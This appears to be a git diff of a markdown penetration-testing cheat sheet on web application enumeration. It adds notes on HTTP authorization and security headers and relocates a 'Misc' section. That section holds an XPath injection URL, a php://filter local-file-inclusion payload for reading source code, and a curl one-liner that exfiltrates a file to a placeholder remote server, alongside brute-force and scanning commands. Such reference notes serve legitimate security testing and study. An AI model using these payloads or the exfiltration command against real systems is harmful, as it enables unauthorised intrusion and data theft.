@@ -101,57 +101,6 @@ Local File Inclusion \(LFI\) / Remote File Inclusion \(RFI\)
 
 Common and/or useful files to check for when exploiting Local File Inclusion \(for both Linux and Windows\): [https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)
 
-## Misc
-
-### XPATH Dump
-
-```text
-https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
-```
-
-### LFI - Retrieve HTML/PHP files without executing
-
-```text
-https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
-```
-
-whatismybrowser.com - research User-Agent strings
-
-Injecting IPs when `.` is disallowed: convert dotted-decimal format to decimal value - [`ip2dh`](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)
-
-Use `curl` to exfiltrate file on remote server \(from attackers box\): `curl -d @/<file> <remote server>`
-
-in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)
-
-vulnerability testing for webdav \(or other file upload vulns!\): `davtest`
-
-bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)
-
-Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`
-
-pull Google cached webpage if regular site not loading: `cache:https://<somewebsite>`
-
-Virtual Host Routing: substitute IP for hostname to get different results
-
-### gobuster
-
-```bash
-gobuster -u $url -w $wordlist -l -x php -t 20
-[-l include length, -x append .php to searches, -t threads]
-```
-
-hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](https://www.youtube.com/watch?v=TJVghYBByIA)
-
-web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)
-
-Web site "flyover" surveillance: [Aquatone](https://github.com/michenriksen/aquatone) "is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface" - from the author \(see link\). Visual dirbuster?
-
-### Crawl web pages for keywords - useful for password/vhost enumeration lists
-
-```bash
-cewl
-```
-
 ## HTTP Enumeration
 
 * Search for folders with gobuster:
@@ -261,6 +210,53 @@ finger batman@$ip
 nikto -useproxy http://$ip:3128 -h $ip
 ```
 
+### Cookies
+
+* [https://cookiepedia.co.uk/](https://cookiepedia.co.uk/)
+  * "Largest Database of Pre-Categorized Cookies"
+  * Scans a website for cookie usage
+
+### HTTP Authorization headers
+
+```bash
+# Basic Auth (Base64)
+Authorization: Basic AXVubzpwQDU1dzByYM==
+
+# Bearer Token (JWT)
+Authorization: Bearer <token>
+
+# API Key
+GET /endpoint?api_key=abcdefgh123456789
+X-API-Key: abcdefgh123456789
+
+# Digest Auth
+Authorization: Digest username=”admin” Realm=”abcxyz” nonce=”474754847743646”, uri=”/uri” response=”7cffhfr54685gnnfgerg8”
+
+# OAuth2.0
+Authorization: Bearer hY_9.B5f-4.1BfE
+
+# Hawk Authentication
+Authorization: Hawk id="abcxyz123", ts="1592459563", nonce="gWqbkw", mac="vxBCccCutXGV30gwEDKu1NDXSeqwfq7Z0sg/HP1HjOU="
+
+# AWS signature
+Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east-1/execute-api/aws4_
+```
+
+### HTTP Security Headers
+
+1. [X-Frame-Options](https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader)
+2. [X-XSS-Protection](https://www.netsparker.com/whitepaper-http-security-headers/#XXSSProtectionHTTPHeader)
+3. [X-Content-Type-Options](https://www.netsparker.com/whitepaper-http-security-headers/#XContentTypeOptionsHTTPHeader)
+4. [X-Download-Options](https://www.netsparker.com/whitepaper-http-security-headers/#XDownloadOptionsHTTPHeader)
+5. [Content Security Policy \(CSP\)](https://www.netsparker.com/whitepaper-http-security-headers/#ContentSecurityPolicyHTTPHeader)
+6. [HTTP Strict Transport Security \(HSTS\)](https://www.netsparker.com/whitepaper-http-security-headers/#HTTPStrictTransportSecurityHSTSHTTPHeader)
+7. [HTTP Public Key Pinning](https://www.netsparker.com/whitepaper-http-security-headers/#HTTPPublicKeyPinning)
+8. [Expect-CT](https://www.netsparker.com/whitepaper-http-security-headers/#ExpectCTHTTPHeader)
+9. [Referrer-Policy](https://www.netsparker.com/whitepaper-http-security-headers/#ReferrerPolicyHTTPHeader)
+
+* [https://www.netsparker.com/whitepaper-http-security-headers/](https://www.netsparker.com/whitepaper-http-security-headers/)
+* [https://owasp.org/www-project-secure-headers/](https://owasp.org/www-project-secure-headers/)
+
 ## OpenVAS Vulnerability Scanner
 
 ```bash
@@ -274,8 +270,92 @@ openvas-setup
 #Check that it is running on port 939
 netstat -tulpn
 
-#Login by using a browser to navigate to: https://127.0.0.1:939
+#Login by using a browser and navigating to: https://127.0.0.1:939
 ```
+
+## Misc
+
+### XPATH Dump
+
+```text
+https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
+```
+
+### LFI - Retrieve HTML/PHP files without executing
+
+```text
+https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+```
+
+whatismybrowser.com - research User-Agent strings
+
+Injecting IPs when `.` is disallowed: convert dotted-decimal format to decimal value - [`ip2dh`](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)
+
+Use `curl` to exfiltrate file on remote server \(from attackers box\): `curl -d @/<file> <remote server>`
+
+in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)
+
+vulnerability testing for webdav \(or other file upload vulns!\): `davtest`
+
+bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)
+
+Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`
+
+pull Google cached webpage if regular site not loading: `cache:https://<somewebsite>`
+
+Virtual Host Routing: substitute IP for hostname to get different results
+
+### gobuster
+
+```bash
+gobuster -u $url -w $wordlist -l -x php -t 20
+[-l include length, -x append .php to searches, -t threads]
+```
+
+hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](https://www.youtube.com/watch?v=TJVghYBByIA)
+
+web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)
+
+Web site "flyover" surveillance: [Aquatone](https://github.com/michenriksen/aquatone) "is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface" - from the author \(see link\). Visual dirbuster?
+
+### Crawl web pages for keywords - useful for password/vhost enumeration lists
+
+```bash
+cewl
+```
+
+### Common checks
+
+```bash
+# robots.txt
+curl http://example.com/robots.txt
+
+# headers
+wget --save-headers http://www.example.com/
+    # Strict-Transport-Security (HSTS)
+    # X-Frame-Options: SAMEORIGIN
+    # X-XSS-Protection: 1; mode=block
+    # X-Content-Type-Options: nosniff
+
+# Cookies
+    # Check Secure and HttpOnly flag in session cookie
+    # If exists BIG-IP cookie, app behind a load balancer
+
+# SSL Ciphers
+nmap --script ssl-enum-ciphers -p 443 www.example.com
+
+# HTTP Methods
+nmap -p 443 --script http-methods www.example.com
+
+# Cross Domain Policy
+curl http://example.com/crossdomain.xml
+    # allow-access-from domain="*"
+
+# Cookies explained
+https://cookiepedia.co.uk/
+```
+
+
 
 
 
